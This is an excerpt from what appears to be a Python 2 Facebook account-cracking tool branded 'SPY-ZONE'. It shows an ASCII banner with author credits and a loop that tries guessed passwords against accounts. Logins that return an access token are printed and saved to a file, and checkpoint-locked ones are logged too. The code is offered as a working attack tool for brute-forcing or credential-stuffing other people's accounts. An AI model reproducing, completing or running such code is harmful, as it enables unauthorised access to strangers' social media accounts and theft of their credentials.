...
logo = """
    ...
    \x1b[1;96m  _____ _______     __   __________  _   _ ______
    \x1b[1;96m / ____|  __ \ \   / /  |___  / __ \| \ | |  ____|
    \x1b[1;96m | (___ | |__) \ \_/ /_____ / / |  | |  \| | |__
    \x1b[1;96m \___ \|  ___/ \   /______/ /| |  | | . ` |  __|
    \x1b[1;96m ____) | |      | |      / /_| |__| | |\  | |____
    \x1b[1;96m |_____/|_|      |_|     /_____\____/|_| \_|______|                         
                                                                                                                                                                      
\x1b[1;96m_________________________________________________
\x1b[1;96m\033[1;96mAuthor   :            SPY-ZONE
\x1b[1;96m\033[1;96mFacebook :         spyzone.offisal
\x1b[1;96m\033[1;96mGitHub   :            SPY-ZONE
\x1b[1;96m\033[1;96mVersion  :              ZONE PRO
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;96m  [SPY_Temp_Lock]  ' + k + c + user + '  |  ' + pass1
                ...
                if 'access_token' in q:
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;96m  [SPY_Temp_Lock]  ' + k + c + user + '  |  ' + pass3
                        okb = open('save/CP.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m  [SPY_CP] ' + k + c + user + '  |  ' + pass3
                        cps = open('save/CP.txt', 'a')
